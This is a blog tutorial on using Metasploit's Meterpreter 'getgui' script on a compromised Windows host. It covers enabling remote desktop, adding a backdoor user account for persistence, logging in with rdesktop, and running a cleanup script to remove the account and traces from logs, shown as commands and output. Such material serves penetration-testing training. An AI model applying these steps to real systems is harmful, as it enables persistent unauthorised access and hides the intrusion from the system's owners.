---
draft: false
title: MSF Remote Desktop Module
date: 2017-05-05T13:30:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: In this article, we will see how we can create a user in the system using the getgui command and then connect to this computer with the rdesktop command.
url: /msf-remote-desktop-module/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
linkTitle: MSF Remote Desktop
translation_key: msfremotedesktop
weight: 1
---

When you open a shell with Meterpreter in Metasploit Framework, one of the operations that can be done is to implement a remote desktop connection. The `getgui` command is very useful for this.

In this article, we will see how we can create a user in the system using the `getgui` command and then connect to this computer with the `rdesktop` command.

We assume that you have opened the Meterpreter shell on the target computer. Now we need the username and password required to establish a visual connection using the getgui command. When you create such a username and password, you will have ensured permanence.

First, let's look at the `getgui` help titles.

```bash
meterpreter > run getgui -h
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u  -p 
Or:    getgui -e

OPTIONS:

    -e   Enable RDP only.
    -f   Forward RDP Connection.
    -h   Help menu.
    -l   The language switch
         Possible Options: 'de_DE', 'en_EN' / default is: 'en_EN'
    -p   The Password of the user
```

## Adding a User

Generally, -u is used to specify the username, -p the password. When you use the getgui command in a similar way to the example below, you add a new user to the system.

```bash
meterpreter > run getgui -u loneferret -p password
> Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
> Carlos Perez carlos_perez@darkoperator.com
> Language detection started
>   Language detected: en_US
> Setting user account for logon
>   Adding User: loneferret with Password: password
>   Adding User: loneferret to local group ''
>   Adding User: loneferret to local group ''
> You can now login with the created user
> For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
meterpreter >
```

## Remote Desktop Connection

Now the user is created. You can connect to the remote desktop using this username and password from another computer on the same network.

```bash
root@kali:~#: rdesktop -u loneferret -p password 192.168.101.108
```

## Log Cleaning

The more you play around with the target system, the more likely you are to be recorded in the log records. For this reason, you should avoid unauthorized actions as much as possible or be content with intervening where necessary.

You may want to clean the log records of the user and session information you created with getgui. The following command example will be useful for this. You can check the most up-to-date version of the /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc file used in the example from the same folder.

```bash
meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
> Running Command List ...
>   Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
Process 288 created.
meterpreter >
```
